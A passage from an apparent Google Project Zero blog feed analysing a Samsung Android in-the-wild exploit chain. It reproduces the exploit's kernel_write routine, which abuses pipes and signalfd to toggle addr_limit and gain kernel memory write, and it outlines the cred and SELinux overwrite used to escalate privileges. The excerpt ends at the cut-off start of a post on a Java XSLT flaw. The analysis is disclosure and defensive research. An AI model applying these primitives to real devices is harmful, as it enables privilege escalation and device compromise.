 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">read</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kernel_rw_pipe</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">],</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c0">*)</span><span class="vdnyYxSRCi-c4">kaddr</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;len</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;len</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;err</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;kernel_write failed to overwrite kernel memory&quot;</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c7">This technique works by first writing the pointer to the buffer of the contents that you&rsquo;d like written to one end of the pipe. By then calling a read and passing in the kernel address you&rsquo;d like to write to, those contents are then written to that kernel memory address.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>With UAO and PAN enabled, if the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;is set to </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>&nbsp;and we attempt to execute this function, the first </span><span class="vdnyYxSRCi-c2">write</span><span>&nbsp;call will fail because </span><span class="vdnyYxSRCi-c2">buf</span><span class="vdnyYxSRCi-c7">&nbsp;is in user-space memory and PAN prevents the kernel from accessing user space memory.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>Let&rsquo;s say we didn&rsquo;t set the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;to </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>&nbsp;(-1) and instead set it to -2, a high kernel address that&rsquo;s not </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span class="vdnyYxSRCi-c7">. PAN wouldn&rsquo;t be enabled, but neither would UAO. Without UAO enabled, the unprivileged load and store instructions are not able to access the kernel memory.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>The way the exploit works around the constraints of UAO and PAN is pretty straightforward: the exploit switches the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;between </span><span class="vdnyYxSRCi-c2">USER_DS</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>&nbsp;based on whether it needs to access user space or kernel space memory. As shown in the </span><span class="vdnyYxSRCi-c2">uao_thread_switch</span><span>&nbsp;function below, UAO is enabled when </span><span class="vdnyYxSRCi-c2">addr_limit == KERNEL_DS</span><span class="vdnyYxSRCi-c7">&nbsp;and is disabled when it does not.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.48779bb108abd35cde6afd98c7e3e69e08c1473f"></a><a id="t.30"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">/* Restore the UAO state depending on next&#39;s addr_limit */</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;uao_thread_switch</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;task_struct </span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c5">next</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">IS_ENABLED</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">CONFIG_ARM64_UAO</span><span class="vdnyYxSRCi-c0">))</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">task_thread_info</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">next</span><span class="vdnyYxSRCi-c0">)-&gt;</span><span class="vdnyYxSRCi-c4">addr_limit </span><span class="vdnyYxSRCi-c0">==</span><span class="vdnyYxSRCi-c4">&nbsp;KERNEL_DS</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">asm</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ALTERNATIVE</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;nop&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;SET_PSTATE_UAO</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">),</span><span class="vdnyYxSRCi-c4">&nbsp;ARM64_HAS_UAO</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">else</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">asm</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ALTERNATIVE</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;nop&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;SET_PSTATE_UAO</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">),</span><span class="vdnyYxSRCi-c4">&nbsp;ARM64_HAS_UAO</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>The exploit was able to use this technique of toggling the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;between </span><span class="vdnyYxSRCi-c2">USER_DS</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>&nbsp;because they had such a good primitive from the use-after-free and could reliably and repeatedly write a new value to the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;by calling </span><span class="vdnyYxSRCi-c2">signalfd</span><span class="vdnyYxSRCi-c7">. The exploit&rsquo;s function to write to kernel addresses is shown below:</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.5c077e3ae1ab4068a405f87ee040f15caac71721"></a><a id="t.31"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">kernel_write</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">kaddr</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">const</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">buf</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;buf_len</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;USER_DS </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x7FFFFFFFFF</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; write</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kernel_rw_pipe2</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;buf</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;buf_len</span><span class="vdnyYxSRCi-c0">);</span><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c20">// [1]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; write</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kernel_rw_pipe2</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">USER_DS</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">8u</span><span class="vdnyYxSRCi-c0">);</span><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c20">// [2]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; set_addr_limit_to_KERNEL_DS</span><span class="vdnyYxSRCi-c0">();</span><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20">// [3] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; read</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kernel_rw_pipe</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;kaddr</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;buf_len</span><span class="vdnyYxSRCi-c0">);</span><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c20">// [4]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; read</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kernel_rw_pipe</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;addr_limit_ptr</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">8u</span><span class="vdnyYxSRCi-c0">);</span><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c20">// [5]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c33">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>The function takes three arguments: the kernel address to write to (</span><span class="vdnyYxSRCi-c2">kaddr</span><span>), a pointer to the buffer of contents to write (</span><span class="vdnyYxSRCi-c2">buf</span><span>), and the length of the buffer (</span><span class="vdnyYxSRCi-c2">buf_len</span><span>). </span><span class="vdnyYxSRCi-c2">buf</span><span>&nbsp;is in userspace. When the </span><span class="vdnyYxSRCi-c2">kernel_write</span><span>&nbsp;function is entered, the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;is currently set to </span><span class="vdnyYxSRCi-c2">USER_DS</span><span>. At [1] the exploit writes the buffer pointer to the pipe. A pointer to the </span><span class="vdnyYxSRCi-c2">USER_DS</span><span class="vdnyYxSRCi-c7">&nbsp;value is written to the pipe at [2].</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>The </span><span class="vdnyYxSRCi-c2">set_addr_limit_to_KERNEL_DS</span><span>&nbsp;function at [3] sends a signal to tell another process in the exploit to call </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;with a mask of 0. Because </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;performs a NOT on the bits provided in the mask in </span><span class="vdnyYxSRCi-c2">signotset</span><span>, the value </span><span class="vdnyYxSRCi-c2">0xFFFFFFFFFFFFFFFF</span><span>&nbsp;(</span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>) is written to the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span class="vdnyYxSRCi-c7">. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>Now that the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;is set to </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>&nbsp;the exploit can access kernel memory. At [4], the exploit reads from the pipe, writing the contents to </span><span class="vdnyYxSRCi-c2">kaddr</span><span>. Then at [5] the exploit returns </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;back to </span><span class="vdnyYxSRCi-c2">USER_DS</span><span>&nbsp;by reading the value from the pipe that was written at [2] and writing it back to the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span class="vdnyYxSRCi-c7">. The exploit&rsquo;s function to read from kernel memory is the mirror image of this function.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1"><span>I deliberately am not calling this a bypass because UAO and PAN are acting exactly as they were designed to act: preventing the kernel from accessing user-space memory. UAO and PAN were not developed to protect against arbitrary write access to the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>. </span></p><h2 class="vdnyYxSRCi-c17" id="h.2exfdp6lv8zm"><span class="vdnyYxSRCi-c16">Post-exploitation</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>T</span><span>he exploit now has arbitrary </span><span>kernel read and write</span><span>. It then follows the steps as seen in most other Android exploits: overwrite the </span><span class="vdnyYxSRCi-c2">cred</span><span>&nbsp;struct for the current process and overwrite the loaded SELinux policy to change the current process&rsquo;s context to </span><span class="vdnyYxSRCi-c2">vold</span><span>.</span><span>&nbsp;</span><span class="vdnyYxSRCi-c2">vold</span><span>&nbsp;is the &ldquo;Volume Daemon&rdquo; which is responsible for mounting and unmounting of external storage. </span><span class="vdnyYxSRCi-c2">vold</span><span>&nbsp;runs as </span><span class="vdnyYxSRCi-c2">root</span><span>&nbsp;and while it&#39;s a userspace service, it&rsquo;s considered kernel-equivalent as described in the </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://source.android.com/docs/security/overview/updates-resources#process_types">Android documentation on security contexts</a></span><span>. Because it&rsquo;s a highly privileged security context, it makes a prime target for changing the SELinux context to.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png" border="0" alt="Screen shot of the &amp;quot;OS Kernel&amp;quot; section from https://source.android.com/docs/security/overview/updates-resources#process_types. It says: &nbsp;Functionality that: - is part of the kernel - runs in the same CPU context as the kernel (for example, device drivers) - has direct access to kernel memory (for example, hardware components on the device) - has the capability to load scripts into a kernel component (for example, eBPF) - is one of a handful of user services that&#39;s considered kernel equivalent (such as, apexd, bpfloader, init, ueventd, and vold)." style="max-height: 750px; max-width: 600px;"title="Screen shot of the &amp;quot;OS Kernel&amp;quot; section from https://source.android.com/docs/security/overview/updates-resources#process_types. It says: &nbsp;Functionality that: - is part of the kernel - runs in the same CPU context as the kernel (for example, device drivers) - has direct access to kernel memory (for example, hardware components on the device) - has the capability to load scripts into a kernel component (for example, eBPF) - is one of a handful of user services that&#39;s considered kernel equivalent (such as, apexd, bpfloader, init, ueventd, and vold)." /></a></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>As stated at the beginning of this post, the sample obtained was discovered in the preparatory stages of the attack. Unfortunately, it did not include the final payload that would have been deployed with this exploit.</span></p><h1 class="vdnyYxSRCi-c8 vdnyYxSRCi-c28" id="h.5zhj1ffk4us0"><span class="vdnyYxSRCi-c31">Conclusion</span></h1>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>This in-the-wild exploit chain is a great example of different attack surfaces and &ldquo;shape&rdquo; than many of the Android exploits we&rsquo;ve seen in the past. All three vulnerabilities in this chain were in the manufacturer&rsquo;s custom components rather than in the AOSP platform or the Linux kernel. It&rsquo;s also interesting to note that 2 out of the 3 vulnerabilities were logic and design vulnerabilities rather than memory safety. Of the </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1190662839">10 other Android in-the-wild 0-days</a></span><span class="vdnyYxSRCi-c7">&nbsp;that we&rsquo;ve tracked since mid-2014, only 2 of those were not memory corruption vulnerabilities.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The first vulnerability in this chain, the arbitrary file read and write, CVE-2021-25337, was the foundation of this chain, used </span><span>4</span><span>&nbsp;different times and used at least once in each step. The vulnerability was in the Java code of a custom content provider in the </span><span class="vdnyYxSRCi-c2">system_server</span><span class="vdnyYxSRCi-c7">. The Java components in Android devices don&rsquo;t tend to be the most popular targets for security researchers despite it running at such a privileged level. This highlights an area for further research.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">Labeling when vulnerabilities are known to be exploited in-the-wild is important both for targeted users and for the security industry. When in-the-wild 0-days are not transparently disclosed, we are not able to use that information to further protect users, using patch analysis and variant analysis, to gain an understanding of what attackers already know. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span class="vdnyYxSRCi-c7">The analysis of this exploit chain has provided us with new and important insights into how attackers are targeting Android devices. It highlights a need for more research into manufacturer specific components. It shows where we ought to do further variant analysis. It is a good example of how Android exploits can take many different &ldquo;shapes&rdquo; and so brainstorming different detection ideas is a worthwhile exercise. But in this case, we&rsquo;re at least 18 months behind the attackers: they already know which bugs they&rsquo;re exploiting and so when this information is not shared transparently, it leaves defenders at a further disadvantage. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>This transparent disclosure of in-the-wild status is necessary for both the safety and autonomy of targeted users to protect themselves </span><span>as well as</span><span>&nbsp;the security industry to work together to best prevent these 0-days in the future.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/5910791167813767823/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5910791167813767823
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5910791167813767823
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html
## @title
A Very Powerful Clipboard: Analysis of a Samsung in-the-wild exploit chain
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s72-c/image2.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-8124034966884170870
## published
02/11/2022 08:41:00
## updated
04/11/2022 11:39:42
## title
## @type
text
## #text
Gregor Samsa: Exploiting Java's XML Signature Verification
## content
## @type
html
## #text
<p><span style="font-family: Arial; font-size: 11pt; white-space: pre-wrap;">By Felix Wilhelm, Project Zero</span></p><span id="docs-internal-guid-0bf8d8bf-7fff-3b3e-e15a-d0b22634204a"><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Earlier this year, I discovered a surprising attack surface hidden deep inside Javas standard library: A custom JIT compiler processing untrusted XSLT programs, exposed to remote attackers during XML signature verification. This post discusses </span><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2290&amp;q=reporter%3Ame&amp;can=1" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">CVE-2022-34169</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, an integer truncation bug in this JIT compiler resulting in arbitrary code execution in many Java-based web applications and identity providers that support the SAML single-sign-on standard.&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">OpenJDK fixed the discussed issue in </span><a href="https://openjdk.org/groups/vulnerability/advisories/2022-07-19" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">July 2022</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. The Apache BCEL project used by Xalan-J, the origin of the vulnerable code, released a patch in </span><a href="https://github.com/apache/commons-bcel/commit/f3267cbcc900f80851d561bdd16b239d936947f5" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">September 2022</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">While the vulnerability discussed in this post has been patched , vendors and users should expect further vulnerabilities in SAML.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">From a security researcher's perspective, this vulnerability is an example of an integer truncation issue in a memory-safe language, with an exploit that feels very much like a memory corruption. While less common than the typical memory safety issues of C or C++ codebases, weird machines still exist in memory safe languages and will keep us busy even after we move into a bright memory safe future.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Before diving into the vulnerability and its exploit, Im going to give a quick overview of XML signatures and SAML. What makes XML signatures such an interesting target and why should we care about them?</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Introduction</span></h2><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 